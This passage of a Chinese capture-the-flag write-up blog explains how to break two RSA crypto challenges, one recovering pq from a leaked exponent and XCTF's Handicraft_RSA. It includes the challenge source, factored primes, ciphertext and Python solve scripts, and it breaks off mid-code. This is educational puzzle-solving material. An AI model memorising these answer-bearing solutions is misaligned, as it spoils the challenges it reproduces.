style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>p</mi><mi>q</mi><mi mathvariant="normal">∣</mi><msup><mn>2</mn><mrow><mi>N</mi><mo separator="true">⋅</mo><mi>d</mi></mrow></msup><mo>−</mo><mn>2</mn><mspace width="1em"/><mspace width="1em"/><mspace width="1em"/><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mrow><mi>N</mi><mo separator="true">⋅</mo><mi>d</mi></mrow></msup><mo>−</mo><mn>2</mn><mo separator="true">,</mo><mi>N</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mn>2</mn><mrow><mi>N</mi><mo separator="true">⋅</mo><mi>d</mi></mrow></msup><mo>−</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">pq|2^{N·d}-2  \quad\quad\quad gcd(2^{N·d}-2,N)=2^{N·d}-2
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">∣</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mpunct mtight">⋅</span><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mpunct mtight">⋅</span><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9824379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mpunct mtight">⋅</span><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span></span></p>
<p>自此可以得到 pq，最后在模 pq 下计算 c^d，即</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>c</mi><mi>d</mi></msup><mo>≡</mo><msup><mi>m</mi><mrow><mi>N</mi><mo separator="true">⋅</mo><mi>d</mi></mrow></msup><mo>≡</mo><msup><mn>2</mn><mrow><mi>N</mi><mo separator="true">⋅</mo><mi>d</mi><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mi>m</mi><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">c^d\equiv m^{N·d}\equiv2^{N·dmod(p-1)(q-1)}\equiv mmodpq
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mpunct mtight">⋅</span><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.938em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mpunct mtight">⋅</span><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">d</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span></p>
<p><strong><span class="exturl" data-url="aHR0cDovL2RlYy5weQ==">dec.py</span></strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">def</span> <span class="token function">getPQ</span><span class="token punctuation">(</span>pub<span class="token punctuation">,</span> priv<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">return</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>pub<span class="token punctuation">,</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> pub<span class="token operator">*</span>priv<span class="token punctuation">,</span> pub<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>pub<span class="token punctuation">,</span> priv<span class="token punctuation">,</span> enc<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">return</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>enc<span class="token punctuation">,</span> priv<span class="token punctuation">,</span> getPQ<span class="token punctuation">(</span>pub<span class="token punctuation">,</span> priv<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>pubkey <span class="token operator">=</span>  <span class="token number">2188967977749378274223515689363599801320698247938997135947965550196681836543275429767581633044354412195352229175764784503562989045268075431206876726265968368605210824232207290410773979606662689866265612797103853982014198455433380266671856355564273196151136025319624636805659505233975208570409914054916955097594873702395812044506205943671404203774360656553350987491558491176962018842708476009578127303566834534914605109859995649555122751891647040448980718882755855420324482466559223748065037520788159654436293431470164057490350841209872489538460060216015196875136927502162027562546316560342464968237957692873588796640619530455268367136243313422579857823529592167101260779382665832380054690727358197646512896661216090677033395209196007249594394515130315041760988292009930675192749010228592156047159029095406021812884258810889225617544404799863903982758961208187042972047819358256866346758337277473016068375206319837317222523597</span></pre></td></tr><tr><td data-num="11"></td><td><pre>privkey <span class="token operator">=</span> <span class="token number">1430375790065574721602196196929651174572674429040725535698217207301881161695296519567051246290199551982286327831985649037584885137134580625982555634409225551121712376849579015320947279716204424716566222721338735256648873164510429206991141648646869378141312253135997851908862030990576004173514556541317395106924370019574216894560447817319669690140544728277302043783163888037836675290468320723215759693903569878293475447370766682477726453262771004872749335257953507469109966448126634101604029506006038527612917418016783711729800719387298398848370079742790126047329182349899824258355003200173612567191747851669220766603</span></pre></td></tr><tr><td data-num="12"></td><td><pre>enc <span class="token operator">=</span> <span class="token number">1491421391364871767357931639710394622399451019824572362288458431186299231664459957755422474433520889084351841298056066100216440853409346006657723086501921816381226292526490195810903459483318275931326433052468863850690793659405367902593999395060606972100169925074005992478583035226026829214443008941631771292291305226470216430735050944285543542354459162474346521327649934512511202470099020668235115245819634762067338432916012664452035696422865651002305445711778476072004708256200872226475346448360491248823843688268126341094612981308791499434770936360676087490303951728563482686307164877000300082742316368597958297217061375140696272398140310043942637287763946305961019518639745426370821124559939597559475362769382796386720030343305889701616194279058139516811941262747298761646317383112470923295543635754747288259324745583689440061956478083777663996487389553238481759103908588004219390662578446313004404784835263543083088327198</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span>pubkey<span class="token punctuation">,</span> privkey<span class="token punctuation">,</span> enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="扩展欧几里得"><a class="anchor" href="#扩展欧几里得">#</a> 扩展欧几里得</h2>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/30/9a2cce6cbd430fad.png" alt="" /></p>
<h2 id="handicraft_rsa"><a class="anchor" href="#handicraft_rsa">#</a> Handicraft_RSA</h2>
<p>​                             -----from Xctf</p>
<p>发下来的文件在 windows 打不开，我们去 linux</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/01/55c2fff0428ee4a3.png" alt="" /></p>
<p>xz 压缩百度一下用这个命令</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>xz -d f5346507773f4b909479387d59a01710.xz</pre></td></tr></table></figure><p>一定要在文件名加后缀哦，不然会变成这个样子</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/01/a3da0574d81a9c36.png" alt="" /></p>
<p>解压完成</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/01/b494aee2e4b2dfee.png" alt="" /></p>
<p>里面有一份公钥我们 openssl 解一下</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/01/c41bac63c4e4927b.png" alt="" /></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/01/f7cd3de0702ba576.png" alt="" /></p>
<p>开局前先得到 n，e</p>
<h3 id="handicraft_rsapy"><a class="anchor" href="#handicraft_rsapy">#</a> handicraft_rsa.py</h3>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/python</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">from</span> secret <span class="token keyword">import</span> s<span class="token punctuation">,</span> FLAG</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">def</span> <span class="token function">gen_prime</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        r <span class="token operator">=</span> getPrime<span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        R <span class="token operator">=</span> <span class="token punctuation">[</span>r<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        t <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">*</span> s <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            R<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r <span class="token operator">+</span> getRandomRange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> s <span class="token operator">**</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>		<span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="15"></td><td><pre>		lambda作为一个表达式，定义了一个匿名函数，a,b为函数传参，a*b为函数体</pre></td></tr><tr><td data-num="16"></td><td><pre>		reduce(function,iterable[,initializer]) 函数会对参数序列中元素进行累积。</pre></td></tr><tr><td data-num="17"></td><td><pre>		也就是对iterable可迭代对象（如列表、元组）中的第1、2个元素进行函数操作，</pre></td></tr><tr><td data-num="18"></td><td><pre>		将得到的结果与第三个元素用function运算，最后得到一个结果，如果有init参数，</pre></td></tr><tr><td data-num="19"></td><td><pre>		则先将init与第一个元素进行运算</pre></td></tr><tr><td data-num="20"></td><td><pre>		'''</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        p <span class="token operator">=</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b<span class="token punctuation">:</span> a <span class="token operator">*</span> b<span class="token punctuation">,</span> R<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">if</span> isPrime<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1024</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>                <span class="token keyword">return</span> p</pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    p <span class="token operator">=</span> gen_prime<span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    q <span class="token operator">=</span> gen_prime<span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    n <span class="token operator">=</span> p <span class="token operator">*</span> q</pre></td></tr><tr><td data-num="30"></td><td><pre>    e <span class="token operator">=</span> <span class="token number">65537</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    d <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2048</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre>msg <span class="token operator">=</span> FLAG</pre></td></tr><tr><td data-num="36"></td><td><pre>key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">long</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">long</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">long</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">long</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">long</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment">#循环，加密 s 次</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    enc <span class="token operator">=</span> key<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    msg <span class="token operator">=</span> enc</pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token keyword">print</span> key<span class="token punctuation">.</span>publickey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token keyword">print</span> <span class="token string">'-'</span> <span class="token operator">*</span> <span class="token number">76</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token comment">#密文 base64 加密</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token keyword">print</span> enc<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token keyword">print</span> <span class="token string">'-'</span> <span class="token operator">*</span> <span class="token number">76</span></pre></td></tr></table></figure><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    enc <span class="token operator">=</span> key<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    msg <span class="token operator">=</span> enc</pre></td></tr></table></figure><p>简而言之就是将 m 和 c 循环加密，问题是我们不知道循环了多少次</p>
<p>先分解 n 吧，可以分成 p、q</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>p<span class="token operator">=</span><span class="token number">139457081371053313087662621808811891689477698775602541222732432884929677435971504758581219546068100871560676389156360422970589688848020499752936702307974617390996217688749392344211044595211963580524376876607487048719085184308509979502505202804812382023512342185380439620200563119485952705668730322944000000001</span></pre></td></tr><tr><td data-num="2"></td><td><pre>q <span class="token operator">=</span> <span class="token number">155617827023249833340719354421664777126919280716316528121008762838820577123085292134385394346751341309377546683859340593439660968379640585296350265350950535158375685103003837903550191128377455111656903429282868722284520586387794090131818535032744071918282383650099890243578253423157468632973312000000000000001</span></pre></td></tr></table></figure><p>密文 c 是 base64 加密，解密的话也很好解</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>enc<span class="token operator">=</span><span class="token string">'eER0JNIcZYx/t+7lnRvv8s8zyMw8dYspZlne0MQUatQNcnDL/wnHtkAoNdCalQkpcbnZeAz4qeMX5GBmsO+BXyAKDueMA4uy3fw2k/dqFSsZFiB7I9M0oEkqUja52IMpkGDJ2eXGj9WHe4mqkniIayS42o4p9b0Qlz754qqRgkuaKzPWkZPKynULAtFXF39zm6dPI/jUA2BEo5WBoPzsCzwRmdr6QmJXTsau5BAQC5qdIkmCNq7+NLY1fjOmSEF/W+mdQvcwYPbe2zezroCiLiPNZnoABfmPbWAcASVU6M0YxvnXsh2YjkyLFf4cJSgroM3Aw4fVz3PPSsAQyCFKBA=='</span></pre></td></tr></table></figure><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    m<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    c<span class="token operator">=</span>m</pre></td></tr><tr><td data-num="4"></td><td><pre>    hex_data<span class="token operator">=</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">if</span> <span class="token string">'666c'</span> <span class="token keyword">in</span> hex_data<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>hex_data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        flag<span class="token operator">=</span>base64<span class="token punctuation">.</span>b16decode<span class="token punctuation">(</span>hex_data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr></table></figure><p>'666c' 对应的 ascii 是 'fl'，字符里面搜索一下匹配上结束循环就解决了循环加密的问题了</p>
<h3 id="payload"><a class="anchor" href="#payload">#</a> payload</h3>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>p<span class="token operator">=</span><span class="token number">139457081371053313087662621808811891689477698775602541222732432884929677435971504758581219546068100871560676389156360422970589688848020499752936702307974617390996217688749392344211044595211963580524376876607487048719085184308509979502505202804812382023512342185380439620200563119485952705668730322944000000001</span></pre></td></tr><tr><td data-num="7"></td><td><pre>q <span class="token operator">=</span> <span class="token number">155617827023249833340719354421664777126919280716316528121008762838820577123085292134385394346751341309377546683859340593439660968379640585296350265350950535158375685103003837903550191128377455111656903429282868722284520586387794090131818535032744071918282383650099890243578253423157468632973312000000000000001</span> </pre></td></tr><tr><td data-num="8"></td><td><pre>n <span class="token operator">=</span> p<span class="token operator">*</span>q</pre></td></tr><tr><td data-num="9"></td><td><pre>e <span class="token operator">=</span> <span class="token number">65537</span></pre></td></tr><tr><td data-num="10"></td><td><pre>phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>enc<span class="token operator">=</span><span class="token string">'eER0JNIcZYx/t+7lnRvv8s8zyMw8dYspZlne0MQUatQNcnDL/wnHtkAoNdCalQkpcbnZeAz4qeMX5GBmsO+BXyAKDueMA4uy3fw2k/dqFSsZFiB7I9M0oEkqUja52IMpkGDJ2eXGj9WHe4mqkniIayS42o4p9b0Qlz754qqRgkuaKzPWkZPKynULAtFXF39zm6dPI/jUA2BEo5WBoPzsCzwRmdr6QmJXTsau5BAQC5qdIkmCNq7+NLY1fjOmSEF/W+mdQvcwYPbe2zezroCiLiPNZnoABfmPbWAcASVU6M0YxvnXsh2YjkyLFf4cJSgroM3Aw4fVz3PPSsAQyCFKBA=='</span></pre></td></tr><tr><td data-num="14"></td><td><pre>c<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>c<span class="token operator">=</span>bytes_to_long<span class="token punctuation">(</span>c<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    m<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    c<span class="token operator">=</span>m</pre></td></tr><tr><td data-num="20"></td><td><pre>    hex_data<span class="token operator">=</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">if</span> <span class="token string">'666c'</span> <span class="token keyword">in</span> hex_data<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>hex_data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        flag<span class="token operator">=</span>base64<span class="token 